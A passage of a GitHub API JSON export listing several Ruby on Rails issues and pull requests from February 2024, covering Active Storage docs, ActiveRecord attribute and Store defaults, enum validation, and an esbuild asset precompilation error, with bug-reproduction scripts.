                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            },
            {
                "id": 664533972,
                "node_id": "MDU6TGFiZWw2NjQ1MzM5NzI=",
                "url": "https://api.github.com/repos/rails/rails/labels/activestorage",
                "name": "activestorage",
                "color": "bfd4f2",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-04T19:08:35Z",
        "updated_at": "2024-02-05T03:37:40Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "The current guide https://edgeguides.rubyonrails.org/active_storage_overview.html#authenticated-controllers for building an authenticated controller in rails proxy mode isn't complete. If you follow the included example you will end up with the following error.\r\n\r\n```\r\nArgumentError:\r\n       Cannot generate URL for xxxxxxxx.jpg using Disk service, please set ActiveStorage::Current.url_options.\r\n```\r\n\r\n```ruby\r\n# app/controllers/logos_controller.rb\r\nclass LogosController < ApplicationController\r\n  # Through ApplicationController:\r\n  # include Authenticate, SetCurrentAccount\r\n\r\n  def show\r\n    redirect_to Current.account.logo.url\r\n  end\r\nend\r\n```\r\n\r\nThe proposed fix for this is to set the current host options by prepending `include ActiveStorage::SetCurrent` at the top of the controller.\r\n\r\n```ruby\r\n# app/controllers/logos_controller.rb\r\nclass LogosController < ApplicationController\r\n  include ActiveStorage::SetCurrent\r\n  # Through ApplicationController:\r\n  # include Authenticate, SetCurrentAccount\r\n\r\n  def show\r\n    redirect_to Current.account.logo.url\r\n  end\r\nend\r\n```\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50963/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50963/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50962",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50962/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50962/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50962/events",
        "html_url": "https://github.com/rails/rails/pull/50962",
        "id": 2116962201,
        "node_id": "PR_kwDNIULOZfCqzQ",
        "number": 50962,
        "title": "Update some create `has_one` failure test descriptions",
        "user": {
            "login": "joshuay03",
            "id": 54629302,
            "node_id": "MDQ6VXNlcjU0NjI5MzAy",
            "avatar_url": "https://avatars.githubusercontent.com/u/54629302?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/joshuay03",
            "html_url": "https://github.com/joshuay03",
            "followers_url": "https://api.github.com/users/joshuay03/followers",
            "following_url": "https://api.github.com/users/joshuay03/following{/other_user}",
            "gists_url": "https://api.github.com/users/joshuay03/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/joshuay03/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/joshuay03/subscriptions",
            "organizations_url": "https://api.github.com/users/joshuay03/orgs",
            "repos_url": "https://api.github.com/users/joshuay03/repos",
            "events_url": "https://api.github.com/users/joshuay03/events{/privacy}",
            "received_events_url": "https://api.github.com/users/joshuay03/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 1072773639,
                "node_id": "MDU6TGFiZWwxMDcyNzczNjM5",
                "url": "https://api.github.com/repos/rails/rails/labels/ready",
                "name": "ready",
                "color": "fef2c0",
                "default": false,
                "description": "PRs ready to merge"
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-04T08:46:44Z",
        "updated_at": "2024-02-13T01:10:34Z",
        "closed_at": "2024-02-13T01:07:04Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50962",
            "html_url": "https://github.com/rails/rails/pull/50962",
            "diff_url": "https://github.com/rails/rails/pull/50962.diff",
            "patch_url": "https://github.com/rails/rails/pull/50962.patch",
            "merged_at": "2024-02-13T01:07:04Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nUpdate some create `has_one` test descriptions to indicate failure when using the `#create_*` constructor.\r\n\r\n### Detail\r\n\r\nI ran into these tests when looking into a separate issue and found the failures confusing when running against my changes. The descriptions were change [in this PR](https://github.com/rails/rails/pull/41238), but I think the reasoning there is incorrect. These are indeed creation failures, and I have added an additional assertion to make that clear.\r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\nNone.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50962/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50962/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50961",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50961/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50961/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50961/events",
        "html_url": "https://github.com/rails/rails/issues/50961",
        "id": 2116894272,
        "node_id": "I_kwDNIULOfi0-QA",
        "number": 50961,
        "title": "`ActiveRecord::Attributes::ClassMethod#attribute` `default:` proc should be evaluated in subclass or instance context",
        "user": {
            "login": "sambostock",
            "id": 8219340,
            "node_id": "MDQ6VXNlcjgyMTkzNDA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8219340?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sambostock",
            "html_url": "https://github.com/sambostock",
            "followers_url": "https://api.github.com/users/sambostock/followers",
            "following_url": "https://api.github.com/users/sambostock/following{/other_user}",
            "gists_url": "https://api.github.com/users/sambostock/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sambostock/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sambostock/subscriptions",
            "organizations_url": "https://api.github.com/users/sambostock/orgs",
            "repos_url": "https://api.github.com/users/sambostock/repos",
            "events_url": "https://api.github.com/users/sambostock/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sambostock/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-04T05:36:35Z",
        "updated_at": "2024-02-05T03:38:09Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\"\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :posts, force: true do |t|\r\n    t.string :type, null: false\r\n    t.string :title, null: false\r\n  end\r\nend\r\n\r\nclass Post < ActiveRecord::Base\r\n  attribute :title, default: -> { default_title }\r\nend\r\n\r\nclass InternalPost < Post\r\n  def self.default_title = \"Untitled Internal Post\" # Feels like it should call this...\r\n  def default_title      = \"Untitled Internal Post\" # ...or maybe this.\r\nend\r\n\r\nclass ExternalPost < Post\r\n  def self.default_title = \"Untitled External Post\"\r\n  def default_title      = \"Untitled External Post\"\r\nend\r\n\r\nclass BugTest < ActiveSupport::TestCase\r\n  test \"default title is assigned based on subclass\" do\r\n    assert_equal \"Untitled Internal Post\", InternalPost.new.title\r\n    #  NameError: undefined local variable or method `default_title' for class Post\r\n    assert_equal \"Untitled External Post\", ExternalPost.new.title\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\nThe `attribute` `default:` proc should be evaluated in the context of the model being created (or the instance being created).\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\nThe `attribute` `default:` proc should be evaluated in the context it closed around.\r\n\r\nThis makes it impossible to define defaults which differ per subclass within an inheritance hierarchy.\r\n\r\n### System configuration\r\n**Rails version**: rails 7.1.3\r\n\r\n**Ruby version**: ruby 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50961/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50961/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50960",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50960/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50960/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50960/events",
        "html_url": "https://github.com/rails/rails/issues/50960",
        "id": 2116888349,
        "node_id": "I_kwDNIULOfi0nHQ",
        "number": 50960,
        "title": "`ActiveRecord::Store` with JSON column uses `nil` as default value instead of `{}`",
        "user": {
            "login": "sambostock",
            "id": 8219340,
            "node_id": "MDQ6VXNlcjgyMTkzNDA=",
            "avatar_url": "https://avatars.githubusercontent.com/u/8219340?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/sambostock",
            "html_url": "https://github.com/sambostock",
            "followers_url": "https://api.github.com/users/sambostock/followers",
            "following_url": "https://api.github.com/users/sambostock/following{/other_user}",
            "gists_url": "https://api.github.com/users/sambostock/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/sambostock/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/sambostock/subscriptions",
            "organizations_url": "https://api.github.com/users/sambostock/orgs",
            "repos_url": "https://api.github.com/users/sambostock/repos",
            "events_url": "https://api.github.com/users/sambostock/events{/privacy}",
            "received_events_url": "https://api.github.com/users/sambostock/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-04T05:08:13Z",
        "updated_at": "2024-02-08T10:23:26Z",
        "closed_at": null,
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n<!-- (Guidelines for creating a bug report are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#creating-a-bug-report)) -->\r\n\r\n<!-- Paste your executable test case created from one of the scripts found [here](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#create-an-executable-test-case) below: -->\r\n```ruby\r\n# frozen_string_literal: true\r\n\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  gem \"rails\" # , github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"sqlite3\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# This connection will do for database-independent bug reports.\r\nActiveRecord::Base.establish_connection(adapter: \"sqlite3\", database: \":memory:\")\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :nullable_settings, force: true do |t|\r\n    t.json :settings\r\n  end\r\n\r\n  create_table :non_nullable_settings, force: true do |t|\r\n    t.json :settings, null: false\r\n  end\r\nend\r\n\r\nclass BugTest < ActiveSupport::TestCase\r\n  self.test_order = :sorted # Not required, but makes it easier to look at the debug output.\r\n\r\n  setup { ActiveRecord::Base.logger.debug(name) }\r\n\r\n  test \"1_creating nullable settings without settings saves nil\" do\r\n    assert_stores_nil(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"nullable_settings\"\r\n    end)\r\n  end\r\n\r\n  test \"2_creating non-nullable settings without settings raises error\" do\r\n    assert_raises_not_null_violation(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"non_nullable_settings\"\r\n    end)\r\n  end\r\n\r\n  test \"3_creating nullable settings with attribute default saves empty hash\" do\r\n    assert_stores_empty_hash(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"nullable_settings\"\r\n      model.attribute :settings, :json, default: {}\r\n    end)\r\n  end\r\n\r\n  test \"4_creating non-nullable settings with attribute default saves empty hash\" do\r\n    assert_stores_empty_hash(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"non_nullable_settings\"\r\n      model.attribute :settings, :json, default: {}\r\n    end)\r\n  end\r\n\r\n  test \"5_creating nullable settings with store saves nil\" do\r\n    assert_stores_nil(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"nullable_settings\"\r\n      model.store :settings\r\n    end)\r\n  end\r\n\r\n  test \"6_creating non-nullable settings with store raises error\" do\r\n    assert_stores_empty_hash(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"non_nullable_settings\"\r\n      model.store :settings\r\n    end) # fails (NotNullViolation)\r\n  end\r\n\r\n  test \"7_creating nullable settings with store and attribute default saves nil\" do\r\n    assert_stores_empty_hash(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"nullable_settings\"\r\n      model.attribute :settings, :json, default: {}\r\n      model.store :settings\r\n    end) # fails (nil, not {})\r\n  end\r\n\r\n  test \"8_creating non-nullable settings with store and attribute default raises error\" do\r\n    assert_stores_empty_hash(Class.new(ActiveRecord::Base) do |model|\r\n      model.table_name = \"non_nullable_settings\"\r\n      model.attribute :settings, :json, default: {}\r\n      model.store :settings\r\n    end) # fails (NotNullViolation)\r\n  end\r\n\r\n  private\r\n\r\n  def assert_stores_nil(model)                = assert_nil(model.create!.settings_before_type_cast)\r\n  def assert_raises_not_null_violation(model) = assert_raises(ActiveRecord::NotNullViolation) { model.create! }\r\n\r\n  def assert_stores_empty_hash(model)\r\n    assert_equal(\"{}\", model.create!.settings_before_type_cast)\r\n  rescue ActiveRecord::NotNullViolation => error\r\n    flunk error.message\r\n  end\r\nend\r\n\r\n```\r\n\r\n### Expected behavior\r\n<!-- Tell us what should happen -->\r\nWhen using `ActiveRecord::Store` with a column of type `json`, the default value written to the database should be an empty `Hash` (serialized as an empty JSON object `{}`), especially if the attribute is marked as having a default value of `{}`.\r\n\r\n### Actual behavior\r\n<!-- Tell us what happens instead -->\r\nWhen using `ActiveRecord::Store` with a column of type `json`, the default value written to the database is `nil`.\r\n\r\nThis is problematic when using non-nullable JSON columns, which cannot accept defaults at the database schema level, as there is no way to avoid violating the `NULL` constraint.\r\n\r\n### System configuration\r\n**Rails version**: rails 7.1.3\r\n\r\n**Ruby version**: ruby 3.3.0\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50960/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50960/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50959",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50959/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50959/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50959/events",
        "html_url": "https://github.com/rails/rails/issues/50959",
        "id": 2116635906,
        "node_id": "I_kwDNIULOfilNAg",
        "number": 50959,
        "title": "[Bug][7.1+] Development of \"Add validation option for enum\" is incomplete",
        "user": {
            "login": "james-em",
            "id": 63726983,
            "node_id": "MDQ6VXNlcjYzNzI2OTgz",
            "avatar_url": "https://avatars.githubusercontent.com/u/63726983?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/james-em",
            "html_url": "https://github.com/james-em",
            "followers_url": "https://api.github.com/users/james-em/followers",
            "following_url": "https://api.github.com/users/james-em/following{/other_user}",
            "gists_url": "https://api.github.com/users/james-em/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/james-em/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/james-em/subscriptions",
            "organizations_url": "https://api.github.com/users/james-em/orgs",
            "repos_url": "https://api.github.com/users/james-em/repos",
            "events_url": "https://api.github.com/users/james-em/events{/privacy}",
            "received_events_url": "https://api.github.com/users/james-em/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-03T18:38:18Z",
        "updated_at": "2024-02-03T20:45:07Z",
        "closed_at": "2024-02-03T20:45:07Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\nAccording to the changelog https://github.com/rails/rails/releases/tag/v7.1.0 (Find: Add validation option for enum) there is a new feature introduced in Rails 7.1 where is is possible to add `validate: true` to an enum to avoid raising an exception as soon as an invalid value is assigned to an enum.\r\n\r\nIt seems the work was properly done but only to one of the 2 possible syntax.\r\n\r\n```ruby\r\n# Fine:\r\nenum :something, %i[test1 test2], validate: true\r\n\r\n# Not fine:\r\nenum something_else: { test1: \"test1\", test2: \"test2\"}, _validate: true\r\n```\r\n\r\n### Expected behavior\r\nBoth should behave the same\r\n\r\n### Actual behavior\r\nThe second line will prevent Rails to even boot as it will consider `_validate: true` to be an enum value and will raise \r\n```\r\nraise ArgumentError, \"Enum values #{values} must be either a non-empty hash or an array.\"\r\n```\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.2\r\n\r\n\r\n**How to fix Rails**\r\nactiverecord-7.1.3/lib/active_record/enum.rb\r\n\r\n```ruby\r\n    def enum(name = nil, values = nil, **options)\r\n      if name\r\n        values, options = options, {} unless values\r\n        return _enum(name, values, **options)\r\n      end\r\n\r\n      # HERE: Simply add: :_validate to definitions because the signature of _enum is def _enum(name, values, prefix: nil, suffix: nil, scopes: true, instance_methods: true, validate: false, **options)\r\n      definitions = options.slice!(:_prefix, :_suffix, :_scopes, :_default, :_instance_methods, :_validate)\r\n      options.transform_keys! { |key| :\"#{key[1..-1]}\" }\r\n\r\n      definitions.each { |name, values| _enum(name, values, **options) }\r\n    end\r\n```",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50959/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50959/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50958",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50958/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50958/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50958/events",
        "html_url": "https://github.com/rails/rails/pull/50958",
        "id": 2116092234,
        "node_id": "PR_kwDNIULOZeUV5A",
        "number": 50958,
        "title": "Add missing alias to errors array",
        "user": {
            "login": "laomatt",
            "id": 9632282,
            "node_id": "MDQ6VXNlcjk2MzIyODI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/9632282?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/laomatt",
            "html_url": "https://github.com/laomatt",
            "followers_url": "https://api.github.com/users/laomatt/followers",
            "following_url": "https://api.github.com/users/laomatt/following{/other_user}",
            "gists_url": "https://api.github.com/users/laomatt/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/laomatt/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/laomatt/subscriptions",
            "organizations_url": "https://api.github.com/users/laomatt/orgs",
            "repos_url": "https://api.github.com/users/laomatt/repos",
            "events_url": "https://api.github.com/users/laomatt/events{/privacy}",
            "received_events_url": "https://api.github.com/users/laomatt/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107190,
                "node_id": "MDU6TGFiZWwxMDcxOTA=",
                "url": "https://api.github.com/repos/rails/rails/labels/activemodel",
                "name": "activemodel",
                "color": "00E5FF",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-03T01:01:09Z",
        "updated_at": "2024-02-03T18:42:02Z",
        "closed_at": "2024-02-03T18:42:02Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/50958",
            "html_url": "https://github.com/rails/rails/pull/50958",
            "diff_url": "https://github.com/rails/rails/pull/50958.diff",
            "patch_url": "https://github.com/rails/rails/pull/50958.patch",
            "merged_at": null
        },
        "body": "it used to be that the << operator was able to add error messages during the validation process, this restores that functionality.\r\n\r\n<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nThis Pull Request has been created because errors in active record validations seem to be missing the << functionality it used to have\r\n\r\n### Detail\r\n\r\nThis Pull Request changes the array returned by ar errors\r\n\r\n### Additional information\r\n\r\nJust wanted to restore the alias of >> to 'add'\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [ ] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [ ] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [ ] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50958/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50958/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/50954",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/50954/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/50954/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/50954/events",
        "html_url": "https://github.com/rails/rails/issues/50954",
        "id": 2115098687,
        "node_id": "I_kwDNIULOfhHYPw",
        "number": 50954,
        "title": "esbuild precompilation error in rails 7.1.3",
        "user": {
            "login": "PhilippGsell",
            "id": 58818799,
            "node_id": "MDQ6VXNlcjU4ODE4Nzk5",
            "avatar_url": "https://avatars.githubusercontent.com/u/58818799?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/PhilippGsell",
            "html_url": "https://github.com/PhilippGsell",
            "followers_url": "https://api.github.com/users/PhilippGsell/followers",
            "following_url": "https://api.github.com/users/PhilippGsell/following{/other_user}",
            "gists_url": "https://api.github.com/users/PhilippGsell/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/PhilippGsell/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/PhilippGsell/subscriptions",
            "organizations_url": "https://api.github.com/users/PhilippGsell/orgs",
            "repos_url": "https://api.github.com/users/PhilippGsell/repos",
            "events_url": "https://api.github.com/users/PhilippGsell/events{/privacy}",
            "received_events_url": "https://api.github.com/users/PhilippGsell/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-02T14:43:34Z",
        "updated_at": "2024-02-09T22:20:42Z",
        "closed_at": "2024-02-09T22:20:42Z",
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\ncreate a new rails 7.1.3 Project with esbuild.\r\n```bash\r\n rails new app --javascript esbuild\r\n```\r\nand try to build the docker image without doing any changes\r\n```bash\r\ndocker build -f Dockerfile -t app_test . && docker run -p 3000:3000 -v .:/rails app_test --env RAILS_MASTER_KEY=xxx\r\n```\r\n\r\n### Expected behavior\r\nThe image should build\r\n\r\n### Actual behavior\r\nyarn throws an error while precompiling the assets.\r\n\r\nyarn run v1.22.21\r\n$ esbuild app/javascript/*.* --bundle --sourcemap --format=esm --outdir=app/assets/builds --public-path=/assets\r\n [ERROR] Could not resolve \"@hotwired/turbo-rails\"\r\n\r\n    app/javascript/application.js:2:7:\r\n      2  import \"@hotwired/turbo-rails\"\r\n      The command '/bin/sh -c SECRET_KEY_BASE_DUMMY=1 ./bin/rails assets:precompile' returned a non-zero code: 1\r\n\r\n### System configuration\r\n**Ubuntu version**: 22.04\r\n\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: ruby 3.0.2p107 (2021-07-07 revision 0db68f0233) [x86_64-linux-gnu]\r\n\r\n**gem --version**: 3.3.5\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/50954/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/50954/timeline",
        "performed_via_github_app": null,
        "state_reason": "not_planned"
    },
    {
